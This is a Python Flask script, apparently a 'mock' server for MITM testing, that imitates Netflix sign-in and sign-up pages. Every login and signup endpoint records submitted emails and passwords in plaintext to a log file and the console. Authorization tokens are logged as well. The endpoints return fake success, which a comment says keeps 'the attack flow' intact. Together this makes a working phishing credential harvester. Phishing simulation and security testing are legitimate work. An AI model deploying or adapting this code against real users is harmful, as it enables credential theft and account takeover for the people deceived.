#!/usr/bin/env python3
"""
Mock Netflix Server
Simulates Netflix authentication endpoints for MITM testing

Serves:
1. Login page
2. Signup page
3. API endpoints
4. Authentication flows
"""

import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/app/logs/mock_netflix.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# HTML Templates for Netflix pages
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Netflix - Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #000; color: #fff; padding: 50px; }
        .container { max-width: 400px; margin: 0 auto; background: #1a1a1a; padding: 40px; border-radius: 5px; }
        h1 { text-align: center; color: #e50914; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #333; color: #fff; border: 1px solid #555; }
        button { width: 100%; padding: 10px; background: #e50914; color: #fff; border: none; cursor: pointer; }
        button:hover { background: #bb070f; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Netflix</h1>
        <form id="loginForm" method="POST" action="/api/auth/login">
            <input type="email" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="rememberMe" value="true" style="display:none;">
            <button type="submit">Sign In</button>
        </form>
        <p style="text-align: center; font-size: 12px;">
            New to Netflix? <a href="/signup" style="color: #e50914;">Sign up now</a>
        </p>
    </div>
</body>
</html>
"""

SIGNUP_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Netflix - Join Today</title>
    <style>
        body { font-family: Arial, sans-serif; background: #000; color: #fff; padding: 50px; }
        .container { max-width: 400px; margin: 0 auto; background: #1a1a1a; padding: 40px; border-radius: 5px; }
        h1 { text-align: center; color: #e50914; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #333; color: #fff; border: 1px solid #555; }
        button { width: 100%; padding: 10px; background: #e50914; color: #fff; border: none; cursor: pointer; }
        button:hover { background: #bb070f; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Netflix</h1>
        <h2>Join Today</h2>
        <form id="signupForm" method="POST" action="/api/auth/signup">
            <input type="text" name="firstName" placeholder="First Name" required>
            <input type="text" name="lastName" placeholder="Last Name" required>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password (min 8 chars)" required>
            <input type="password" name="confirmPassword" placeholder="Confirm Password" required>
            <input type="tel" name="phone" placeholder="Phone (optional)">
            <button type="submit">Create Account</button>
        </form>
    </div>
</body>
</html>
"""


@app.route('/', methods=['GET'])
def index():
    """Root page"""
    logger.info(f"[REQUEST] GET / from {request.remote_addr}")
    return LOGIN_PAGE


@app.route('/login', methods=['GET'])
def login_page():
    """Serve login page"""
    logger.info(f"[REQUEST] GET /login from {request.remote_addr}")
    return LOGIN_PAGE


@app.route('/signup', methods=['GET'])
def signup_page():
    """Serve signup page"""
    logger.info(f"[REQUEST] GET /signup from {request.remote_addr}")
    return SIGNUP_PAGE


@app.route('/api/auth/login', methods=['POST'])
def api_login():
    """
    Mock authentication endpoint

    In real MITM attack, this would intercept credentials
    """
    data = request.form if request.form else request.get_json()

    logger.info(f"[AUTH] Login attempt from {request.remote_addr}")
    logger.warning(f"[CREDS] Email: {data.get('email', 'N/A')}")
    logger.warning(f"[CREDS] Password: {data.get('password', 'N/A')}")

    # Log to file
    with open('/app/logs/auth_attempts.log', 'a') as f:
        f.write(f"{datetime.now().isoformat()} - LOGIN - {request.remote_addr} - "
                f"Email: {data.get('email')} - Pass: {data.get('password')}\n")

    # Return success (to not break the attack flow)
    return jsonify({
        'status': 'success',
        'message': 'Authentication successful',
        'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
        'user': {
            'id': '12345',
            'email': data.get('email'),
            'name': 'Test User'
        }
    }), 200


@app.route('/api/auth/signup', methods=['POST'])
def api_signup():
    """
    Mock signup endpoint
    """
    data = request.form if request.form else request.get_json()

    logger.info(f"[SIGNUP] New account attempt from {request.remote_addr}")
    logger.warning(f"[CREDS] Email: {data.get('email', 'N/A')}")
    logger.warning(f"[CREDS] Password: {data.get('password', 'N/A')}")

    # Log to file
    with open('/app/logs/auth_attempts.log', 'a') as f:
        f.write(f"{datetime.now().isoformat()} - SIGNUP - {request.remote_addr} - "
                f"Email: {data.get('email')} - Pass: {data.get('password')}\n")

    return jsonify({
        'status': 'success',
        'message': 'Account created successfully',
        'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
        'user': {
            'id': '12346',
            'email': data.get('email')
        }
    }), 201


@app.route('/api/auth/validate', methods=['POST'])
def api_validate():
    """Validate token endpoint"""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    logger.info(f"[VALIDATE] Token validation from {request.remote_addr}")
    logger.warning(f"[TOKEN] {token[:50]}...")

    return jsonify({
        'valid': True,
        'expires': '2026-08-11T12:00:00Z'
    }), 200


@app.route('/api/user/profile', methods=['GET'])
def get_profile():
    """Get user profile"""
    auth_header = request.headers.get('Authorization', '')

    logger.info(f"[PROFILE] Profile access from {request.remote_addr}")
    logger.warning(f"[AUTH] {auth_header[:50]}...")

    return jsonify({
        'id': '12345',
        'email': 'user@example.com',
        'name': 'Test User',
        'subscription': 'Premium',
        'paymentMethod': '****4242'
    }), 200


@app.route('/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({'status': 'healthy'}), 200


@app.errorhandler(404)
def not_found(error):
    """404 handler"""
    logger.warning(f"[404] Not found: {request.path} from {request.remote_addr}")
    return jsonify({'error': 'Not found'}), 404


if __name__ == '__main__':
    logger.info("=" * 80)
    logger.info("Mock Netflix Server Started")
    logger.info("Listening on port 9999")
    logger.info("=" * 80)

    app.run(host='0.0.0.0', port=9999, debug=False)
